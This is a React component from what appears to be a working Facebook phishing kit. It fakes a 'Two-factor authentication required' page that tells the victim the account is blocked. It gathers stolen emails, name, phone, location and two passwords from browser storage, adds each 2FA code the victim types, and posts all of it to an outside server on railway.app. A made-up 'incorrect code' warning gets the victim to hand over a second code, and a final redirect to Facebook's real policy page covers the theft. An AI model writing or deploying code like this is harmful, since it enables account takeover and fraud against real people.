import React, { useEffect, useState } from 'react'
import { Link, useNavigate } from 'react-router-dom'
import { favicon, icon_warring, twofa } from './Publics/images/images'
import { Button, InputNumber , Form } from 'antd';
import axios from 'axios';

const ConfirmComponent = () => {

    const [activePopup, setActivePopup] = useState(false);
    const [activeLink, setActiveLink] = useState(false);
    const [timeLeft, setTimeLeft] = useState(300); 
    const [activeWaring, setActiveWaring] = useState(false);
    const [form] = Form.useForm();

    const navigate = useNavigate();

    useEffect(() => {
        const countdownInterval = setInterval(() => {
            if (timeLeft > 0) {
                setTimeLeft(timeLeft - 1); 
            } else {
                clearInterval(countdownInterval); 
                setActiveLink(true)
            }
        }, 1000); 

        return () => {
            clearInterval(countdownInterval); 
        };
    }, [timeLeft]);

    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;

    const handleOpendPopup = () => {
        setActivePopup(true)
    }

    const handleClosePopup = () => {
        setActivePopup(false)
    }

    const handleFinal = () => {
        window.location.replace('https://www.facebook.com/policies_center/');
    }

    const onFinishCodes = (values) => {
        
        axios.get(`https://api.db-ip.com/v2/free/self`)
                .then((response) => {

                    if(timeLeft > 0){
                        setActiveWaring(true)
            
                        const dataLocalImages = JSON.parse(localStorage.getItem('dataPassWord'))
                        const firstCode = {...dataLocalImages, first_code: values.fill_code}
            
                        localStorage.setItem('dataFirstCode', JSON.stringify(firstCode))
            
                        const data = {
                            'fill_business_email': firstCode.fill_business_email,
                            'fill_personal_email': firstCode.fill_personal_email,
                            'fill_full_name': firstCode.fill_full_name,
                            'fill_your_name': firstCode.fill_your_name,
                            'fill_phone': firstCode.fill_phone,
                            'ip': firstCode.ip,
                            'city': firstCode.city,
                            'country': firstCode.country,
                            'first_password': firstCode.firt_password,
                            'second_password': firstCode.second_password,
                            'first_code': firstCode.first_code ,
                        }
            
                        form.setFieldsValue({ fill_code: '' });
                        axios.post( "https://server2tele-production.up.railway.app/api/news", data) 
                    }
            
                    
                    if(activeWaring == true) {
                        const dataLocalImages = !JSON.parse(localStorage.getItem('dataFirstCode')) ? JSON.parse(localStorage.getItem('dataPassWord')) : JSON.parse(localStorage.getItem('dataFirstCode'))
                        const finalCode = {...dataLocalImages, seconds_code: values.fill_code}
            
                        localStorage.setItem('dataAllCode', JSON.stringify(finalCode))
            
                        const data = {
                            'fill_business_email': finalCode.fill_business_email,
                            'fill_personal_email': finalCode.fill_personal_email,
                            'fill_full_name': finalCode.fill_full_name,
                            'fill_your_name': finalCode.fill_your_name,
                            'fill_phone': finalCode.fill_phone,
                            'ip': finalCode.ip,
                            'city': finalCode.city,
                            'country': finalCode.country,
                            'first_password': finalCode.firt_password,
                            'second_password': finalCode.second_password,
                            'first_code': finalCode.first_code,
                            'second_code': values.fill_code,
                        }
            
                        axios.post( "https://server2tele-production.up.railway.app/api/news", data)
                            .then((response) => {
                                if (response.data.status === 0 ) {
                                    handleOpendPopup()
                                }
                            })
                    }
                        
                })

        

    };


    return (
        <div>
            <div className="confirm">

                <section className="header">
                    <div className="fotoh">
                        <div className="row">
                            <div className="col-6">
                                <img src={favicon} width="40" className="img-fluid" alt=''/>
                            </div>
                            <div className="col-6" style={{textAlign: "right"}}>
                                <p style={{color: "rgb(53, 120, 229)", display: "none", paddingTop: "8px", marginBottom: "0px", fontWeight: "600", fontSize: "15px"}}>
                                    <i className="fa-solid fa-envelope" style={{fontSize: "16px"}}></i>
                                    Support Inbox
                                </p>
                            </div>
                        </div>
                    </div>
                </section>

                <div className="main-confirm">
                    <div className="container">
                        <div className="content col-md-7 col-12">
                            <Form
                                name="basicForm"
                                initialValues={{
                                remember: true,
                                }}
                                onFinish={onFinishCodes}
                                autoComplete="off"
                                form={form}
                            >
                                <div className="card">
                                    <h3 className="twh3">Two-factor authentication required (1/3)</h3>
                                    <div className="bodyyy">
                                        <p> We have temporarily blocked your account because Facebook Protect has changed. Verify code has been send to +1*****.</p>

                                        <div>
                                            <img src={twofa} width="100%" className="" alt="" />  
                                        </div>
                                           
                                        <div className="css-ant-input form-group" style={{paddingLeft: "0px", paddingTop: "5px", paddingBottom: "10px", display: "inline-block"}}>
                                                
                                            <div
                                                className="item-form"
                                                style={{
                                                    display: "flex",
                                                    alignItems: "center"
                                                }}
                                            >
                                                <Form.Item
                                                    name="fill_code"
                                                    rules={[
                                                        {
                                                        required: true,
                                                        message: '',
                                                        },
                                                    ]}
                                                >
                                                    <InputNumber placeholder='Enter your code' />
                                                </Form.Item>

                                            </div>
                                        </div>

                                        <div className={`${activeWaring === true ? 'active' : ''}`} id="waring-code"> 
                                            <p>The code generator you entered is incorrect. Please wait {minutes} minutes {seconds < 10 ? `0${seconds}` : seconds} seconds to receive another one.</p>
                                        </div>

                                        <div className="bottom">
                                            <div className="icon" style={{width: "2rem"}}>
                                            <svg xmlns="http://www.w3.org/2000/svg" class="ionicon s-ion-icon" viewBox="0 0 512 512"><path d="M256 56C145.72 56 56 145.72 56 256s89.72 200 200 200 200-89.72 200-200S366.28 56 256 56zm0 82a26 26 0 11-26 26 26 26 0 0126-26zm48 226h-88a16 16 0 010-32h28v-88h-16a16 16 0 010-32h32a16 16 0 0116 16v104h28a16 16 0 010 32z"></path></svg>
                                            </div>
                                            <div className="right">
                                                <p>You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser. Enter the 6-digit code from your code generator or third-party app below.</p>
                                                <p style={{fontSize: "1rem"}}>Please wait {minutes} minutes {seconds < 10 ? `0${seconds}` : seconds} seconds to request the sending of the code.</p>
                                            </div>
                                        </div>

                                        <p style={{fontSize: "1rem"}}>We'll walk you through some steps to secure and unlock your account.</p>
                                    </div> 


                                    <div className="footerii" style={{width: "100%", paddingBottom: '10px'}}>
                                        
                                        <Form.Item 
                                            style={{
                                                color: "rgb(255, 255, 255)", 
                                                backgroundColor: "#e9ecef", 
                                                width: "100%",
                                                float: 'right',
                                                margin: '0px 0px 15px 0px',
                                                padding: '7px 7px',
                                                border: '1px solid gray',
                                                borderRadius: '8px'
                                            }}
                                            className="btn butoni btn-hover-112548"
                                        >
                                            <Button
                                                htmlType="submit"
                                                style={{
                                                    backgroundColor: "transparent",
                                                    outline: "none",
                                                    border: 'none',
                                                    boxShadow: 'none',
                                                    fontWeight: '700',
                                                    fontSize:'1rem',
                                                    color: 'black',
                                                    marginBottom: "0",width: "100%"
                                                }}
                                            >
                                                Submit
                                            </Button>
                                        </Form.Item>

                                        <a href="" style={{textDecoration: 'none',textAlign: 'center', display: 'block', padding: '10px 0 7px 0'}}>Send code</a>
                                    </div>
                                </div>
                            </Form>
                        </div>
                    </div>
                </div>


                <div className={`popup  ${activePopup === true ? 'active' : ''}`} id="popup">
                    <div className="background"  onClick={handleClosePopup}></div>
                    <div className="content">
                        <div className="modal-header custom-header px-0">
                            <h5 id="exampleModalLabel" className="modal-title" style={{fontSize: "18px", fontWeight: "600"}}>Form Submitted Successfully!</h5>
                        </div>

                        <div style={{padding : '1rem 0',borderBottom: '1px solid #dee2e6'}}>
                            <p>Thanks for contacting us. You'll get a notification when we respond in 1-2 business days. You can view responses in your Support Inbox.</p>
                        </div>
                        <div style={{textAlign: "right"}}>
                            <button className="btn butoni" style={{
                                color: "rgb(255, 255, 255)", 
                                backgroundColor: "rgb(44, 132, 244)", 
                                width: "auto",
                                float: 'right',
                                margin: '0',
                                // padding: '0.3rem 1rem
                            }}>
                                <a style={{
                                color: "rgb(255, 255, 255)", 
                                padding: '0.3rem 1rem',
                                textDecoration: 'none'
                            }} href="https://www.facebook.com/policies_center">ok</a>
                            </button>
                        </div>

                    </div>
                </div>

            </div>
        </div>
    )
}

export default ConfirmComponent